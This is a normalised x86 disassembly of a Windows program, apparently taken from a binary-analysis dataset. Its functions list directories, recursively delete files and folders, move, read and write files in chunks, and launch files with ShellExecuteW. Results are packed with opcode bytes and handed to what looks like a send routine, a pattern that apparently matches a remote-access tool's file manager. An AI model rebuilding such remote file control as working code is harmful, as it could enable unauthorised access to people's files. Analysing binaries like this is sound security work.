mov [ ebx + 0x2c ] eax
call sub_402ea0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
dec ecx
push ecx
mov ecx esi
call sub_402ff0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x5
jmp r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x10 ]
mov edx ebx
mov [ esp + 0x10 ] 0x6c
call sub_404470
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x0
push 0x0
push esi
push r--data
push 0x0
call [ ShellExecuteW@IAT ]
sub_402340
sub esp 0x470
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x46c ] eax
mov eax [ esp + 0x474 ]
push ebx
push ebp
push esi
push edi
mov ebp 0x2800
push ebp
push 0x40
mov [ esp + 0x20 ] eax
mov esi ecx
mov [ eax + 0x2c ] 0x0
call [ LocalAlloc@IAT ]
push esi
mov ebx eax
lea eax [ esp + 0x274 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x274 ]
push edx
call [ FindFirstFileW@IAT ]
mov edi eax
mov [ esp + 0x1c ] edi
cmp edi 0xffffffff
jne r-xdata
mov [ ebx ] 0x68
mov esi 0x2
mov edx [ esp + 0x18 ]
push 0x1
lea ecx [ esp + 0x1b ]
mov [ esp + 0x1b ] 0x68
call sub_404470
jmp r-xdata
mov ecx r--data
lea eax [ esp + 0x4c ]
push 0x42
add ebp 0x410
push ebp
push ebx
call [ LocalReAlloc@IAT ]
mov ebx eax
mov ecx [ esp + 0x47c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_414a33
add esp 0x470
retn 0x4
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
lea eax [ esp + 0x20 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov ecx r--data
lea eax [ esp + 0x4c ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
lea eax [ ebp - 0x410 ]
cmp esi eax
jbe r-xdata
mov edx [ esp + 0x18 ]
push esi
mov ecx ebx
call sub_404470
push ebx
call [ LocalFree@IAT ]
push edi
call [ FindClose@IAT ]
xor eax eax
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov cl [ esp + 0x20 ]
and cl 0x10
lea edx [ esp + 0x4c ]
mov [ esi + ebx ] cl
push edx
add esi 0x2
call [ lstrlenW@IAT ]
mov edi eax
add edi edi
push edi
lea eax [ esp + 0x50 ]
push eax
lea ecx [ esi + ebx ]
push ecx
call sub_41a3c0
add esi edi
mov edi [ esp + 0x28 ]
mov [ esi + ebx ] 0x0
mov edx [ esp + 0x48 ]
mov [ esi + ebx + 0x2 ] edx
mov eax [ esp + 0x4c ]
add esi 0x2
mov [ esi + ebx + 0x8 ] eax
mov ecx [ esp + 0x40 ]
add esi 0x10
mov [ esi + ebx ] ecx
mov edx [ esp + 0x44 ]
add esp 0xc
mov [ esi + ebx + 0x4 ] edx
add esi 0x10
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_402510
sub esp 0x8
push esi
call [ lstrlenW@IAT ]
lea eax [ esi + eax * 2 + 0x2 ]
push eax
push esi
call [ MoveFileW@IAT ]
mov edx [ esp + 0xc ]
push 0x1
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x71
call sub_404470
add esp 0x8
retn 0x4
sub_402540
sub esp 0x668
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x664 ] eax
push ebx
push ebp
push esi
mov esi [ esp + 0x678 ]
push edi
mov edi [ wsprintfW@IAT ]
push esi
lea eax [ esp + 0x46c ]
push r--data
push eax
mov ebx ecx
call edi
add esp 0xc
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x46c ]
push edx
call [ FindFirstFileW@IAT ]
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
cmp [ esp + 0x3c ] 0x2e
je r-xdata
xor al al
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
test [ esp + 0x10 ] 0x10
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x264 ]
push esi
je r-xdata
mov ecx [ esp + 0x674 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_414a33
add esp 0x668
retn 0x4
push ebp
call [ FindClose@IAT ]
push esi
call [ RemoveDirectoryW@IAT ]
test eax eax
setne al
push r--data
push ecx
call edi
add esp 0x10
lea edx [ esp + 0x260 ]
push edx
call [ DeleteFileW@IAT ]
push r--data
push ecx
call edi
add esp 0x10
lea edx [ esp + 0x260 ]
push edx
mov ecx ebx
call sub_402540
jmp r-xdata
sub_402630
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_416050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi ecx
mov [ ebp - 0x4 ] 0x0
push esi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
call sub_415170
add esp 0x4
mov edi eax
mov [ ebp - 0x20 ] edi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
call [ lstrcpyW@IAT ]
mov esi edi
mov [ ebp - 0x1c ] esi
cmp [ edi ] 0x5c
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x3a
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x5c
jne r-xdata
mov ebx [ GetFileAttributesW@IAT ]
nop
mov esi eax
mov [ ebp - 0x1c ] esi
add esi 0x2
mov [ ebp - 0x1c ] esi
movzx eax [ esi ]
test ax ax
je r-xdata
mov esi eax
mov [ ebp - 0x1c ] esi
add esi 0x2
mov [ ebp - 0x4 ] 0xfffffffe
push edi
call sub_415093
add esp 0x4
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ax 0x5c
jne r-xdata
cmp ax 0x5c
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp ax 0x5c
je r-xdata
push esi
call [ CharNextW@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
jmp r-xdata
xor ecx ecx
mov [ esi ] cx
push edi
call ebx
cmp eax 0xffffffff
jne r-xdata
add esi 0x2
mov [ ebp - 0x1c ] esi
movzx eax [ esi ]
test ax ax
je r-xdata
add esi 0x2
push esi
call [ CharNextW@IAT ]
mov esi eax
jmp r-xdata
movzx eax [ esi ]
test ax ax
je r-xdata
test al 0x10
je r-xdata
push 0x0
push edi
call [ CreateDirectoryW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp ax 0x5c
je r-xdata
mov [ ebp - 0x1c ] esi
movzx eax [ esi ]
test ax ax
je r-xdata
push edi
jmp r-xdata
mov edx 0x5c
mov [ esi ] dx
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
jmp r-xdata
push esi
call [ CharNextW@IAT ]
mov esi eax
jmp r-xdata
call sub_415093
add esp 0x4
mov [ ebp - 0x1c ] esi
lea esp [ esp ]
sub_4027e0
push 0xffffffff
push sub_4262f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x34 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebp [ esp + 0x44 ]
push esi
call [ lstrlenW@IAT ]
cmp [ esi + eax * 2 - 0x2 ] 0x5c
jne r-xdata
xor edi edi
xor eax eax
mov [ esp + 0x1c ] ax
mov eax esi
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] edi
lea edx [ eax + 0x2 ]
nop
push esi
mov ecx ebp
call sub_402930
cmp [ ebp + 0x28 ] 0x0
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax esi
lea esi [ esp + 0x1c ]
call sub_4035a0
mov [ esp + 0x3c ] edi
mov esi [ ebp + 0x24 ]
mov edx [ esi + 0x4 ]
lea ebx [ ebp + 0x10 ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
push esi
call sub_403650
mov ecx ebx
mov edi eax
call sub_4036f0
mov [ esi + 0x4 ] edi
mov eax [ edi + 0x4 ]
mov [ eax ] edi
mov [ esp + 0x3c ] 0xffffffff
cmp [ esp + 0x30 ] 0x8
jb r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x24 ]
mov esi [ edx ]
test eax eax
jne r-xdata
push 0x1
lea ecx [ esp + 0x48 ]
mov edx ebp
mov [ esp + 0x48 ] 0x6b
call sub_404470
jmp r-xdata
xor ecx ecx
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] cx
mov eax [ esp + 0x1c ]
push eax
call sub_40a5fb
add esp 0x4
mov eax [ eax ]
jmp r-xdata
call sub_4153d7
xor eax eax
mov al 0x1
mov ecx [ esp + 0x34 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn 0x4
cmp esi [ eax + 0x14 ]
jne r-xdata
cmp [ esi + 0x20 ] 0x8
jb r-xdata
call sub_4153d7
add esi 0xc
mov esi [ esi + 0xc ]
jmp r-xdata
push ebp
mov ebx esi
call sub_402b50
sub_402930
push 0xffffffff
push sub_42615b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x898
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x890 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8ac ]
mov [ fs : 0x0 ] eax
mov ebx [ esp + 0x8bc ]
push 0x208
lea eax [ esp + 0x498 ]
mov ebp ecx
push 0x0
push eax
mov [ esp + 0x28 ] ebp
call sub_415f60
add esp 0xc
push ebx
call [ lstrlenW@IAT ]
cmp [ ebx + eax * 2 - 0x2 ] 0x5c
je r-xdata
mov [ esp + 0x14 ] r--data
mov esi [ esp + 0x14 ]
mov esi r--data
mov [ esp + 0x14 ] esi
jmp r-xdata
cmp [ esp + 0x68 ] 0x2e
je r-xdata
xor al al
jmp r-xdata
mov edi [ wsprintfW@IAT ]
push esi
push ebx
lea ecx [ esp + 0x49c ]
push r--data
push ecx
call edi
add esp 0x10
lea edx [ esp + 0x3c ]
push edx
lea eax [ esp + 0x498 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x18 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x3c ]
push edx
push eax
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
test [ esp + 0x3c ] 0x10
lea ecx [ esp + 0x68 ]
push ecx
push esi
push ebx
je r-xdata
mov ecx [ esp + 0x8ac ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x890 ]
xor ecx esp
call sub_414a33
add esp 0x8a4
retn 0x4
mov ecx [ esp + 0x18 ]
push ecx
call [ FindClose@IAT ]
mov al 0x1
lea edx [ esp + 0x298 ]
push r--data
push edx
call edi
xor edi edi
add esp 0x14
xor eax eax
mov [ esp + 0x24 ] ax
lea eax [ esp + 0x28c ]
mov [ esp + 0x38 ] 0x7
mov [ esp + 0x34 ] edi
lea edx [ eax + 0x2 ]
lea edx [ esp + 0x6a8 ]
push r--data
push edx
call edi
add esp 0x14
lea eax [ esp + 0x69c ]
push eax
mov ecx ebp
call sub_402930
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x290 ]
lea esi [ esp + 0x24 ]
call sub_4035a0
mov [ esp + 0x8b4 ] edi
mov esi [ ebp + 0x24 ]
mov edx [ esi + 0x4 ]
add ebp 0x10
lea ecx [ esp + 0x20 ]
push ecx
push edx
push esi
call sub_403650
mov ecx ebp
mov edi eax
call sub_4036f0
mov [ esi + 0x4 ] edi
mov eax [ edi + 0x4 ]
mov [ eax ] edi
mov [ esp + 0x8b4 ] 0xffffffff
cmp [ esp + 0x38 ] 0x8
jb r-xdata
mov ebp [ esp + 0x1c ]
mov esi [ esp + 0x14 ]
mov edi [ wsprintfW@IAT ]
xor ecx ecx
mov [ esp + 0x38 ] 0x7
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] cx
mov eax [ esp + 0x24 ]
push eax
call sub_40a5fb
add esp 0x4
sub_402b50
push ecx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
push 0x208
add esi 0x38
push 0x0
push esi
call sub_415f60
mov edx esi
add esp 0xc
mov eax ebx
sub edx ebx
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
jne r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push ebx
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
call [ GetFileSize@IAT ]
push esi
mov ebp eax
call [ CloseHandle@IAT ]
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax + 0x14 ]
push edi
push 0x40
call [ LocalAlloc@IAT ]
push edi
mov esi eax
push 0x0
push esi
call sub_415f60
add esp 0xc
lea edx [ edi - 0x9 ]
push edx
mov [ esi ] 0x69
mov ecx [ esp + 0x10 ]
lea eax [ esi + 0x9 ]
push ebx
push eax
mov [ esi + 0x1 ] ecx
mov [ esi + 0x5 ] ebp
call sub_41a3c0
mov edx [ esp + 0x20 ]
add esp 0xc
push edi
mov ecx esi
call sub_404470
push esi
mov edi eax
call [ LocalFree@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
sub_402c20
sub esp 0x8
cmp [ esi + 0x28 ] 0x0
push ebx
je r-xdata
push 0x1
lea ecx [ esp + 0xc ]
mov edx esi
mov [ esp + 0xc ] 0x6b
call sub_404470
pop ebx
add esp 0x8
retn
lea ebx [ esi + 0x10 ]
call sub_4032c0
sub_402c50
push ecx
push ebp
mov ebp [ esp + 0xc ]
push esi
xor esi esi
cmp [ ebx + 0x4 ] 0xffffffff
push edi
mov [ esp + 0xc ] esi
jne r-xdata
push esi
push 0x80
push 0x3
push esi
push 0x1
push 0x80000000
lea eax [ ebp + 0x38 ]
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebp
call sub_402d30
xor eax eax
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
mov ecx [ ebx + 0x4 ]
push esi
push ebx
push ecx
push edi
call [ SetFilePointer@IAT ]
push 0x2000
push 0x40
mov [ esp + 0x1c ] esi
call [ LocalAlloc@IAT ]
mov esi eax
push 0x0
mov [ esi ] 0x6a
mov edx [ ebx ]
lea ecx [ esp + 0x18 ]
push ecx
mov [ esi + 0x1 ] edx
mov eax [ ebx + 0x4 ]
push 0x1ff7
lea edx [ esi + 0x9 ]
push edx
push edi
mov [ esi + 0x5 ] eax
call [ ReadFile@IAT ]
push edi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
jbe r-xdata
or eax eax
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
push ebp
call sub_402d30
mov edi [ esp + 0xc ]
push esi
call [ LocalFree@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
add eax 0x9
push eax
mov ecx esi
mov edx ebp
call sub_404470
push esi
mov edi eax
call [ LocalFree@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
sub_402d30
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov ecx [ ebp + 0x10 ]
push esi
push edi
lea edi [ ebp + 0x10 ]
push eax
push ecx
lea ebx [ esp + 0x18 ]
call sub_403220
cmp [ ebp + 0x28 ] 0x0
jne r-xdata
mov ecx [ edi + 0x14 ]
mov edi [ edi ]
mov esi [ ecx ]
test edi edi
jne r-xdata
push 0x1
lea ecx [ esp + 0x20 ]
mov edx ebp
mov [ esp + 0x20 ] 0x6b
call sub_404470
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov edi [ edi ]
jmp r-xdata
call sub_4153d7
cmp esi [ edi + 0x14 ]
jne r-xdata
cmp [ esi + 0x20 ] 0x8
jb r-xdata
call sub_4153d7
add esi 0xc
push ebp
mov ebx esi
call sub_402b50
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov esi [ esi + 0xc ]
push ebp
mov ebx esi
call sub_402b50
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
sub_402dd0
sub esp 0x260
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x258 ] eax
push ebx
push ebp
lea eax [ edi + 0x8 ]
push esi
mov ebx ecx
lea edx [ eax + 0x2 ]
nop
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push 0x208
sub eax edx
sar eax 0x1
lea esi [ ebx + 0x38 ]
push 0x0
push esi
mov ebp eax
call sub_415f60
add esp 0xc
push ebp
lea eax [ edi + 0x9 ]
push eax
push esi
call sub_41523a
mov ecx [ edi + 0xc ]
mov [ ebx + 0x30 ] ecx
add esp 0xc
mov ecx esi
mov [ ebx + 0x34 ] 0x0
call sub_402630
lea edx [ esp + 0x10 ]
push edx
push esi
call [ FindFirstFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
call sub_402ea0
mov eax [ ebx + 0x2c ]
cmp eax 0x4
je r-xdata
cmp eax 0x2
je r-xdata
cmp eax 0x6
je r-xdata
push 0x1
lea ecx [ esp + 0x10 ]
mov edx ebx
mov [ esp + 0x10 ] 0x6d
call sub_404470
jmp r-xdata
push esi
call [ FindClose@IAT ]
mov ecx [ esp + 0x264 ]
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_414a33
add esp 0x260
retn
sub_402ea0
sub esp 0x26c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x264 ] eax
mov ecx [ ebx + 0x2c ]
mov eax ecx
sub eax 0x2
push esi
push edi
je r-xdata
mov esi 0x1
sub eax 0x2
je r-xdata
xor ecx ecx
mov [ esp + 0x261 ] ecx
mov [ esp + 0x265 ] ecx
lea esi [ ecx + 0x2 ]
jmp r-xdata
cmp esi 0x1
jne r-xdata
mov esi 0x3
jmp r-xdata
sub eax 0x2
je r-xdata
push eax
call [ FindClose@IAT ]
push 0x0
push 0x80
push esi
push 0x0
push 0x2
push 0x40000000
push edi
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
cmp esi 0x3
jne r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x30 ]
mov [ esp + 0x261 ] ecx
mov [ esp + 0x265 ] edx
mov esi 0x3
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea edi [ ebx + 0x38 ]
push edi
call [ FindFirstFileW@IAT ]
xor ecx ecx
mov [ esp + 0x260 ] ecx
mov [ esp + 0x264 ] ecx
mov [ esp + 0x268 ] cl
mov [ esp + 0x260 ] 0x70
cmp eax 0xffffffff
je r-xdata
mov esi 0x5
jmp r-xdata
mov esi ecx
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
push 0x9
lea ecx [ esp + 0x264 ]
mov edx ebx
call sub_404470
mov ecx [ esp + 0x26c ]
pop edi
pop esi
xor ecx esp
call sub_414a33
add esp 0x26c
retn
mov [ ebx + 0x30 ] 0x0
mov [ ebx + 0x34 ] 0x0
pop edi
pop esi
mov ecx [ esp + 0x264 ]
xor ecx esp
call sub_414a33
add esp 0x26c
retn
cmp esi 0x5
jne r-xdata
mov esi [ esp + 0xc ]
mov [ esp + 0x265 ] 0xffffffff
mov esi 0x3
jmp r-xdata
sub_402ff0
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
push ebp
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
mov esi ecx
mov eax [ esi ]
mov ebp [ esi + 0x4 ]
push 0x2
push 0x40000000
lea ecx [ ebx + 0x38 ]
push ecx
mov [ esp + 0x2c ] eax
call [ CreateFileW@IAT ]
push 0x0
lea edx [ esp + 0x14 ]
push edx
mov edi eax
push ebp
push edi
call [ SetFilePointer@IAT ]
mov ecx [ esp + 0x2c ]
push 0x0
lea eax [ esp + 0x18 ]
push eax
add ecx 0xfffffff8
push ecx
add esi 0x8
push esi
push edi
call [ WriteFile@IAT ]
push edi
call [ CloseHandle@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x19 ] edx
add eax ebp
push 0x9
lea ecx [ esp + 0x1c ]
mov edx ebx
mov [ esp + 0x1c ] 0x70
mov [ esp + 0x21 ] eax
call sub_404470
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_414a33
add esp 0x1c
retn 0x4
sub_4030a0
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_403430
pop edi
mov eax esi
pop esi
retn 0x4
sub_4030e0
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call sub_40a5fb
add esp 0x4
sub_403140
push 0xffffffff
push sub_425fd8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push 0x4
call sub_40a5cc
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esp + 0x10 ] 0x0
call sub_403410
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0x0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_4031b0
push 0xffffffff
push sub_425fd8
mov eax [ fs : 0x0 ]
push eax
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov ebx [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
call sub_4032c0
mov eax [ ebx + 0x14 ]
push eax
call sub_40a5fb
mov [ esp + 0x14 ] 0xffffffff
mov eax [ ebx ]
push eax
mov [ ebx + 0x14 ] 0x0
call sub_40a5fb
add esp 0x8
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
add esp 0xc
retn 0x4
sub_403220
sub esp 0x8
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_4153d7
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ eax + 0x14 ]
jne r-xdata
xor eax eax
mov edx [ esp + 0x14 ]
mov eax [ edx ]
mov [ esp + 0x14 ] eax
cmp esi [ edi + 0x14 ]
je r-xdata
call sub_4153d7
mov ecx [ esp + 0x14 ]
mov edx [ edi ]
mov [ ebx + 0x4 ] ecx
mov [ ebx ] edx
mov eax ebx
pop esi
add esp 0x8
retn 0x8
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov [ ecx ] edx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
push esi
mov [ esi + 0xc ] ax
call sub_40a5fb
add esp 0x4
dec [ edi + 0x18 ]
mov edx [ esi + 0xc ]
push edx
call sub_40a5fb
add esp 0x4
sub_4032c0
mov eax [ ebx + 0x14 ]
push esi
mov esi [ eax ]
mov [ eax ] eax
mov eax [ ebx + 0x14 ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x18 ] 0x0
cmp esi [ ebx + 0x14 ]
je r-xdata
pop esi
retn
push edi
jmp r-xdata
cmp [ esi + 0x20 ] 0x8
mov edi [ esi ]
jb r-xdata
xor ecx ecx
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
push esi
mov [ esi + 0xc ] cx
call sub_40a5fb
add esp 0x4
mov esi edi
cmp edi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esi + 0xc ]
push eax
call sub_40a5fb
add esp 0x4
pop edi
sub_403330
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebx + 0x14 ] ebp
jae r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ esp + 0x1c ]
sub edi ebp
cmp eax edi
jae r-xdata
call sub_4259a9
cmp esi ebx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebp
push edi
mov ecx esi
call sub_403510
push ebp
push 0x0
mov ecx esi
call sub_403510
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_425971
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_4037b0
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
lea edx [ ebx + 0x4 ]
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ esi + 0x18 ]
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ ebx + edi ] 0x0
mov ebx [ ebx ]
push edi
add edx ebp
push edx
push ecx
push eax
call sub_4153e7
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_403430
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov esi ecx
test ebp ebp
je r-xdata
mov edi [ esp + 0x14 ]
cmp edi 0xfffffffe
jbe r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_425971
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x14 ]
push edx
push edi
mov ecx esi
call sub_4037b0
test edi edi
cmp edx 0x10
jb r-xdata
cmp ebp ecx
jb r-xdata
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x14 ]
add edi ecx
cmp edi ebp
jbe r-xdata
mov [ ebx + edi ] 0x0
pop ebx
mov ebx [ ebx ]
push edi
push ebp
push ecx
push eax
call sub_4153e7
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
sub ebp eax
push ebp
push esi
mov ecx esi
call sub_403330
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ eax ]
sub_403510
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
cmp [ esi + 0x14 ] ebx
jae r-xdata
mov eax [ esi + 0x14 ]
mov edi [ esp + 0x14 ]
